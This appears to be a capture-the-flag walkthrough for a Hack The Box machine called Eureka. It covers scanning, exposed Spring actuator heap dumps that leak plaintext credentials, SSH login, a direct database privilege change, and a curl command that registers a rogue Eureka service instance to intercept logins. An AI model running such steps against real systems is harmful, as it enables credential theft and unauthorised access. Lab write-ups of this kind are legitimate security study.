# User flag
## 1. rustscan

```python
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)

80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://furni.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8761/tcp open  unknown syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 401 
|     Vary: Origin
|     Vary: Access-Control-Request-Method
|     Vary: Access-Control-Request-Headers
|     Set-Cookie: JSESSIONID=322E41620D86E5B1D8FF83ACB8C6D0E1; Path=/; HttpOnly
|     WWW-Authenticate: Basic realm="Realm"
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 0
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     Pragma: no-cache
|     Expires: 0
|     X-Frame-Options: DENY
|     Content-Length: 0
|     Date: Tue, 29 Apr 2025 02:45:41 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 401 
|     Vary: Origin
|     Vary: Access-Control-Request-Method
|     Vary: Access-Control-Request-Headers
|     Set-Cookie: JSESSIONID=49F9936BC935D4B4DE8005E47ACCC913; Path=/; HttpOnly
|     WWW-Authenticate: Basic realm="Realm"
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 0
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     Pragma: no-cache
|     Expires: 0
|     X-Frame-Options: DENY
|     Content-Length: 0
|     Date: Tue, 29 Apr 2025 02:45:41 GMT
|     Connection: close
|   RPCCheck: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Tue, 29 Apr 2025 02:45:42 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|     Request</h1></body></html>
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Tue, 29 Apr 2025 02:45:41 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
```

## 2. dirsearch

```
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ dirsearch -u http://furni.htb/  -e* 

[23:39:14] 200 -   20B  - /actuator/caches                                  
[23:39:14] 200 -  467B  - /actuator/features                                
[23:39:15] 200 -    2B  - /actuator/info                                    
[23:39:15] 200 -    6KB - /actuator/env                                     
[23:39:15] 200 -   15B  - /actuator/health
[23:39:15] 405 -  114B  - /actuator/refresh                                 
[23:39:15] 200 -    3KB - /actuator/metrics                                 
[23:39:15] 400 -  108B  - /actuator/sessions                                
[23:39:15] 200 -   54B  - /actuator/scheduledtasks                          
[23:39:16] 200 -   35KB - /actuator/mappings                                
[23:39:17] 200 -   99KB - /actuator/loggers                                 
[23:39:17] 200 -   36KB - /actuator/configprops                             
[23:39:18] 200 -  198KB - /actuator/beans                                   
[23:39:18] 200 -  180KB - /actuator/conditions                              
[23:39:21] 200 -  306KB - /actuator/threaddump                              
[23:39:21] 200 -   76MB - /actuator/heapdump      
```

## 3. check actuator
* https://medium.com/defmax/analyzing-java-heap-dumps-via-oql-queries-fef8a8416017
![[Pasted image 20250429123856.png]]
=> `EurekaSrvr:0scarPWDisTheB3st`
RXVyZWthU3J2cjowc2NhclBXRGlzVGhlQjNzdA==

![[Pasted image 20250429125419.png]] ```
jdbc:mysql://localhost:3306/Furni_WebApp_DB§{password=0sc@r190_S0l!dP@sswd, user=oscar190}```

## 3. ssh as oscar190

```
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ ssh oscar190@10.129.82.230        

Last login: Tue Apr 29 04:56:34 2025 from 10.10.14.20
oscar190@eureka:~$ mysql -u "oscar190" -p'0sc@r190_S0l!dP@sswd' -h 'localhost'

MariaDB [Furni_WebApp_DB]> UPDATE users SET is_staff = 1 WHERE id = 15;
```

![[Pasted image 20250429130410.png]]

```
oscar190@eureka:~$ cat /etc/passwd | grep -vP "(nologin|sync|false)"
root:x:0:0:root:/root:/bin/bash
oscar190:x:1000:1001:,,,:/home/oscar190:/bin/bash
miranda-wise:x:1001:1002:,,,:/home/miranda-wise:/bin/bash


╔══════════╣ Executable files potentially added by user (limit 70)
2025-04-10+09:16:27.5391427570 /usr/local/sbin/laurel 
```

## 4. eureka
* https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka
![[Pasted image 20250429163550.png]]
```python
2025/04/29 05:51:01 CMD: UID=0     PID=512668 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh 
2025/04/29 05:51:01 CMD: UID=0     PID=512671 | curl http://furni.htb/login   -H Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 -H Accept-Language: en-US,en;q=0.8 -H Cache-Control: max-age=0 -H Connection: keep-alive -H Content-Type: application/x-www-form-urlencoded -H Cookie: SESSION=YzNlZmI3ODYtNTE4NS00MDE2LWFjMzMtMDhiZTkxNmJhYjRm -H User-Agent: Mozilla/5.0 (X11; Linux x86_64) --data @/tmp/tmp.9C6o1K1xYv --insecure -i
```

```json
curl -u EurekaSrvr:0scarPWDisTheB3st --basic -v http://furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE -H 'Content-Type: application/json' --data-raw "$(cat data)"

# data
{ "instance": { "instanceId": "10.10.16.4:USER-MANAGEMENT-SERVICE:8081", "app": "USER-MANAGEMENT-SERVICE", "appGroupName": "USER-MANAGEMENT-SERVICE", "ipAddr": "10.10.16.4", "sid": "na", "homePageUrl": "http://10.10.16.4:8081/", "statusPageUrl": "http://localhost:8081/actuator/info", "healthCheckUrl": "http://localhost:8081/actuator/health", "secureHealthCheckUrl": null, "vipAddress": "USER-MANAGEMENT-SERVICE", "secureVipAddress": "USER-MANAGEMENT-SERVICE", "countryId": 1, "dataCenterInfo": { "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo", "name": "MyOwn" }, "hostName": "10.10.16.4", "status": "UP", "overriddenStatus": "UNKNOWN", "leaseInfo": { "renewalIntervalInSecs": 30, "durationInSecs": 90, "registrationTimestamp": 0, "lastRenewalTimestamp": 0, "evictionTimestamp": 0, "serviceUpTimestamp": 0 }, "isCoordinatingDiscoveryServer": false, "lastUpdatedTimestamp": 1630906180645, "lastDirtyTimestamp": 1630906182808, "actionType": null, "asgName": null, "port": { "$": 8081, "@enabled": "true" }, "securePort": { "$": 443, "@enabled": "false" }, "metadata": { "management.port": "8081" } } }
```

![[Pasted image 20250429143414.png]]

![[Pasted image 20250429143918.png]]
![[Pasted image 20250429144122.png]]

# root flag
## 1. pspy

![[Pasted image 20250429163818.png]]

```bash
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ cat script.sh 
#!/bin/bash

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'

LOG_FILE="$1"
OUTPUT_FILE="log_analysis.txt"

declare -A successful_users  # Associative array: username -> count
declare -A failed_users      # Associative array: username -> count
STATUS_CODES=("200:0" "201:0" "302:0" "400:0" "401:0" "403:0" "404:0" "500:0") # Indexed array: "code:count" pairs

if [ ! -f "$LOG_FILE" ]; then
    echo -e "${RED}Error: Log file $LOG_FILE not found.${RESET}"
    exit 1
fi


analyze_logins() {
    # Process successful logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${successful_users[$username]+_}" ]; then
            successful_users[$username]=$((successful_users[$username] + 1))
        else
            successful_users[$username]=1
        fi
    done < <(grep "LoginSuccessLogger" "$LOG_FILE")

    # Process failed logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${failed_users[$username]+_}" ]; then
            failed_users[$username]=$((failed_users[$username] + 1))
        else
            failed_users[$username]=1
        fi
    done < <(grep "LoginFailureLogger" "$LOG_FILE")
}


analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}


analyze_log_errors(){
     # Log Level Counts (colored)
    echo -e "\n${YELLOW}[+] Log Level Counts:${RESET}"
    log_levels=$(grep -oP '(?<=Z  )\w+' "$LOG_FILE" | sort | uniq -c)
    echo "$log_levels" | awk -v blue="$BLUE" -v yellow="$YELLOW" -v red="$RED" -v reset="$RESET" '{
        if ($2 == "INFO") color=blue;
        else if ($2 == "WARN") color=yellow;
        else if ($2 == "ERROR") color=red;
        else color=reset;
        printf "%s%6s %s%s\n", color, $1, $2, reset
    }'

    # ERROR Messages
    error_messages=$(grep ' ERROR ' "$LOG_FILE" | awk -F' ERROR ' '{print $2}')
    echo -e "\n${RED}[+] ERROR Messages:${RESET}"
    echo "$error_messages" | awk -v red="$RED" -v reset="$RESET" '{print red $0 reset}'

    # Eureka Errors
    eureka_errors=$(grep 'Connect to http://localhost:8761.*failed: Connection refused' "$LOG_FILE")
    eureka_count=$(echo "$eureka_errors" | wc -l)
    echo -e "\n${YELLOW}[+] Eureka Connection Failures:${RESET}"
    echo -e "${YELLOW}Count: $eureka_count${RESET}"
    echo "$eureka_errors" | tail -n 2 | awk -v yellow="$YELLOW" -v reset="$RESET" '{print yellow $0 reset}'
}


display_results() {
    echo -e "${BLUE}----- Log Analysis Report -----${RESET}"

    # Successful logins
    echo -e "\n${GREEN}[+] Successful Login Counts:${RESET}"
    total_success=0
    for user in "${!successful_users[@]}"; do
        count=${successful_users[$user]}
        printf "${GREEN}%6s %s${RESET}\n" "$count" "$user"
        total_success=$((total_success + count))
    done
    echo -e "${GREEN}\nTotal Successful Logins: $total_success${RESET}"

    # Failed logins
    echo -e "\n${RED}[+] Failed Login Attempts:${RESET}"
    total_failed=0
    for user in "${!failed_users[@]}"; do
        count=${failed_users[$user]}
        printf "${RED}%6s %s${RESET}\n" "$count" "$user"
        total_failed=$((total_failed + count))
    done
    echo -e "${RED}\nTotal Failed Login Attempts: $total_failed${RESET}"

    # HTTP status codes
    echo -e "\n${CYAN}[+] HTTP Status Code Distribution:${RESET}"
    total_requests=0
    # Sort codes numerically
    IFS=$'\n' sorted=($(sort -n -t':' -k1 <<<"${STATUS_CODES[*]}"))
    unset IFS
    for entry in "${sorted[@]}"; do
        code=$(echo "$entry" | cut -d':' -f1)
        count=$(echo "$entry" | cut -d':' -f2)
        total_requests=$((total_requests + count))
        
        # Color coding
        if [[ $code =~ ^2 ]]; then color="$GREEN"
        elif [[ $code =~ ^3 ]]; then color="$YELLOW"
        elif [[ $code =~ ^4 || $code =~ ^5 ]]; then color="$RED"
        else color="$CYAN"
        fi
        
        printf "${color}%6s %s${RESET}\n" "$count" "$code"
    done
    echo -e "${CYAN}\nTotal HTTP Requests Tracked: $total_requests${RESET}"
}


# Main execution
analyze_logins
analyze_http_statuses
display_results | tee "$OUTPUT_FILE"
analyze_log_errors | tee -a "$OUTPUT_FILE"
echo -e "\n${GREEN}Analysis completed. Results saved to $OUTPUT_FILE${RESET}"
```

![[Pasted image 20250429164558.png]]

![[Pasted image 20250429165002.png]]